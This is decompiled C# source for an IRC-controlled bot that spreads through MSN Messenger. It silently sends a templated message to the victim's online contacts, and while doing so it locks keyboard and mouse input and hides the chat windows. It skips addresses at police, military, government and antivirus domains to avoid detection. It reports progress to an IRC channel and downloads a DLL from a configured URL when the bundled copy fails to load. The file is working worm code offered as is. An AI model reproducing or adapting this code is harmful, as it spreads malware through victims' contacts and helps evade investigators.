using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using MessengerAPI;
using TBOT.Properties;

namespace TBOT;

internal class MSNZZ
{
	private const int SC_CLOSE = 61536;

	private const int WM_SYSCOMMAND = 274;

	private const int WM_SETTEXT = 12;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_CHAR = 258;

	private const int SW_HIDE = 0;

	private const int SW_SHOWNORMAL = 1;

	private const int SW_SHOWMINIMIZED = 2;

	private const int SW_SHOWMAXIMIZED = 3;

	private const int SW_SHOWNOACTIVATE = 4;

	private const int SW_RESTORE = 9;

	private const int SW_SHOWDEFAULT = 10;

	public static string lmessage = "";

	public static bool lrunning = false;

	public static string dllURL = "";

	public static string message = "";

	public static int interval = 900;

	public static int msgsent = 0;

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BlockInput([In][MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("User32.dll")]
	private static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, string lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, IntPtr windowTitle);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(IntPtr ZeroOnly, string lpWindowName);

	private static bool isBot(string email)
	{
		List<string> list = new List<string>();
		list.Add("teachthisbot@hotmail.com");
		list.Add("encarta@botmetro.net");
		list.Add("alice@worldofalice.com");
		list.Add("alice@worldofalice.nl");
		list.Add("alice@worldofalice.pl");
		list.Add("alice@worldofalice.es");
		list.Add("blabla@chatman.tv");
		list.Add("homer.bot@botmetro.net");
		list.Add("botofthought@hotmail.com");
		list.Add("billybones@deadmanstale.com");
		list.Add("googlematic@interconnected.org");
		list.Add("bot@liverecipe.net");
		list.Add("smarterchild@hotmail.com");
		list.Add("secretarybot@hotmail.com");
		list.Add("perfectboyfriendbot@hotmail.com");
		list.Add("hate_your_peeps@hotmail.com");
		list.Add("comtec_bot@hotmail.co.uk");
		list.Add("gridiron-guru@hotmail.com");
		list.Add("botgoogle@hotmail.com");
		list.Add("santa.robot@hotmail.com");
		list.Add("gamesbot@botmetro.net");
		list.Add("astrobot@botmetro.net");
		list.Add("secretsparkle@botmetro.net");
		list.Add("yoursearchbunny@hotmail.com");
		list.Add("chat@insidemessenger.com");
		list.Add("fordedge@botmetro.net");
		list.Add("talktofrankbot@hotmail.co.uk");
		list.Add("lilypanda@gopetslive.com");
		list.Add("bbcbackstage@hotmail.com");
		list.Add("chat@insidemessenger.com");
		list.Add("myfashionablelife@hotmail.com");
		list.Add("revolutionimserv@hotmail.com");
		list.Add("makeadifference@live.com");
		list.Add("wilma@live.com");
		list.Add("bot@gwaam.com");
		list.Add("buddy@mrmovie.com");
		list.Add("bot@yachtcharterguilder.com");
		list.Add("magic8ball@botmetro.net");
		list.Add("espbilly@msn.com");
		list.Add("dfwebbot@hotmail.com");
		list.Add("dictionary_bot@hotmail.com");
		list.Add("alienchat@hotmail.com");
		list.Add("celebritybot@hotmail.com");
		list.Add("tv_answers@hotmail.com");
		list.Add("crystalballbuddy@hotmail.com");
		list.Add("musebot@live.com");
		list.Add("quizmasterbot@hotmail.com");
		list.Add("scholarbot@hotmail.com");
		list.Add("lunchbot@hotmail.com");
		list.Add("magic8ball@botmetro.net");
		list.Add("mapsearcher@hotmail.it ");
		list.Add("spleak@hotmail.com");
		list.Add("dubyabot@hotmail.com");
		list.Add("careerbuilderuk@hotmail.com");
		list.Add("moviescout@botmetro.net");
		list.Add("delpdeskbot@hotmail.com ");
		list.Add("windiesbot@hotmail.com");
		list.Add("collegefootball-guru@hotmail.com");
		list.Add("fox.fantasy.football@hotmail.com");
		list.Add("emiel.tasseel@hotmail.com");
		list.Add("dionty@hotmail.com");
		return list.Contains(email);
	}

	private static bool isReg(string email)
	{
		List<string> list = new List<string>();
		list.Add(".gov");
		list.Add(".mil");
		list.Add("kaspersky.com");
		list.Add("hackforums.net");
		list.Add("malwares-in.net");
		list.Add("virustotal.com");
		list.Add("novirusthanks.org");
		list.Add("virusalert.nl");
		list.Add("hoaxkiller.fr");
		list.Add("hoaxbuster.com");
		list.Add("hoaxbusters.org");
		list.Add("symantec.com");
		list.Add("mcafee.com");
		list.Add("f-secure.com");
		list.Add("sophos.com");
		list.Add("trendmicro.com");
		list.Add("virusalert.nl");
		list.Add("hoaxkiller.fr");
		list.Add("hoaxbuster.com");
		list.Add("symantec.com");
		list.Add("mcafee.com");
		list.Add("mcafee.com");
		list.Add("f-secure.com");
		list.Add("politie.be");
		list.Add("kombijdepolitie.nl");
		list.Add("politie.nl");
		list.Add("politie-amsterdam-amstelland.nl");
		list.Add("politie-rijnmond.nl");
		list.Add("infopolitie.nl");
		list.Add("politie-arnhem.nl");
		list.Add("politieacademie.nl");
		list.Add("polfed-fedpol.be");
		list.Add("policelocale.be");
		list.Add("jobpol.be");
		list.Add("mil.be");
		list.Add("mil-mod.nl");
		list.Add("dje-style.com");
		list.Add("amadox.nl");
		foreach (string item in list)
		{
			if (email.EndsWith(item))
			{
				return true;
			}
		}
		return false;
	}

	private static string removeMSGplusTags(string source)
	{
		string pattern = "\\[.*?\\]";
		return Regex.Replace(source, pattern, string.Empty);
	}

	public static void sendmessage()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Invalid comparison between Unknown and I4
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Expected O, but got Unknown
		grabDLL();
		try
		{
			Messenger val = (Messenger)new MessengerClass();
			foreach (IMessengerContact item in (IMessengerContacts)((IMessenger4)val).get_MyContacts())
			{
				IMessengerContact val2 = item;
				if ((int)val2.get_Status() == 1 || val2.get_IsSelf() || isBot(val2.get_SigninName()) || val2.get_Blocked() || isReg(val2.get_SigninName()))
				{
					continue;
				}
				try
				{
					string text = removeMSGplusTags(val2.get_FriendlyName());
					foreach (IMessengerContact item2 in (IMessengerContacts)((IMessenger4)val).get_MyContacts())
					{
						IMessengerContact val3 = item2;
						IntPtr hWnd = FindWindow(IntPtr.Zero, removeMSGplusTags(val3.get_FriendlyName()) + " <" + val3.get_SigninName() + ">");
						try
						{
							PostMessage(hWnd, 274u, (IntPtr)61536, IntPtr.Zero);
						}
						catch
						{
						}
					}
					foreach (IMessengerContact item3 in (IMessengerContacts)((IMessenger4)val).get_MyContacts())
					{
						IMessengerContact val4 = item3;
						IntPtr hWnd2 = FindWindow(IntPtr.Zero, val4.get_FriendlyName() + " <" + val4.get_SigninName() + ">");
						try
						{
							PostMessage(hWnd2, 274u, (IntPtr)61536, IntPtr.Zero);
						}
						catch
						{
						}
					}
					BlockInput(fBlockIt: true);
					Thread.Sleep(1000);
					((IMessenger4)val).InstantMessage((object)val2);
					IntPtr intPtr = FindWindow(IntPtr.Zero, val2.get_FriendlyName() + " <" + val2.get_SigninName() + ">");
					if (intPtr.ToString() == "0")
					{
						intPtr = FindWindow(IntPtr.Zero, text + " <" + val2.get_SigninName() + ">");
					}
					ShowWindow(intPtr, 0);
					IntPtr parentHandle = FindWindowEx(intPtr, IntPtr.Zero, "IM Window Class", IntPtr.Zero);
					IntPtr hWnd3 = FindWindowEx(parentHandle, IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
					string text2 = message.Replace("%semail%", ((IMessenger4)val).get_MySigninName()).Replace("%vemail%", val2.get_SigninName()).Replace("%sname%", ((IMessenger4)val).get_MyFriendlyName())
						.Replace("%vname%", val2.get_FriendlyName());
					string text3 = text2;
					foreach (char c in text3)
					{
						int num = c;
						uint wParam = Convert.ToUInt32(num.ToString().ToUpper());
						PostMessage(hWnd3, 258u, wParam, 2097153u);
						Thread.Sleep(100);
					}
					PostMessage(hWnd3, 256u, 13u, 2097153u);
					Thread.Sleep(100);
					msgsent++;
					PostMessage(intPtr, 274u, (IntPtr)61536, IntPtr.Zero);
					BlockInput(fBlockIt: false);
					Thread.Sleep(interval);
					if (msgsent == 10)
					{
						Irc.WriteTo(Config.ircChannel, "Sent To: 10 Contacts So Far!");
					}
				}
				catch
				{
					BlockInput(fBlockIt: false);
				}
			}
			Irc.WriteTo(Config.ircChannel, "Sent To: " + msgsent.ToString() + 1 + " Contacts!");
		}
		catch
		{
			BlockInput(fBlockIt: false);
			Irc.WriteTo(Config.ircChannel, "[MSN]: Error Sending Message!");
		}
		BlockInput(fBlockIt: false);
	}

	public static void grabDLL()
	{
		if (File.Exists("MSNMessengerAPI.dll"))
		{
			FileInfo fileInfo = new FileInfo("MSNMessengerAPI.dll");
			if (fileInfo.Length == 57344L)
			{
				return;
			}
			try
			{
				File.Delete("MSNMessengerAPI.dll");
			}
			catch
			{
			}
		}
		try
		{
			BinaryWriter binaryWriter = new BinaryWriter(File.Open("MSNMessengerAPI.dll", FileMode.Create));
			binaryWriter.Write(Resources.MessengerAPI);
			reg.dll();
		}
		catch
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Config.msndll, Environment.CurrentDirectory + "MSNMessengerAPI.dll");
			webClient.Dispose();
		}
	}

	public static bool msninstalled()
	{
		return File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Windows Live\\Messenger\\msnmsgr.exe");
	}
}
